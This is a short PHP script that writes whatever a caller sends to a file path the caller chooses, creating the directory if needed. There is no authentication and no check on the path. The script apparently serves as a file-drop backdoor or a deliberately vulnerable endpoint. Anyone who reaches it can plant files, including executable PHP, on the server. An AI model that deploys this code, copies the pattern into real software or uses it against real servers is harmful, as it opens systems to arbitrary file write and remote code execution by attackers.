
<?php
$userDir = $_GET['dir'];
if ($userDir and !is_dir($userDir)) {
    mkdir($userDir);
}
$userPath = "" . $_GET['path'];
$userContent = file_get_contents('php://input');
file_put_contents($userPath, $userContent);
echo "true"
?>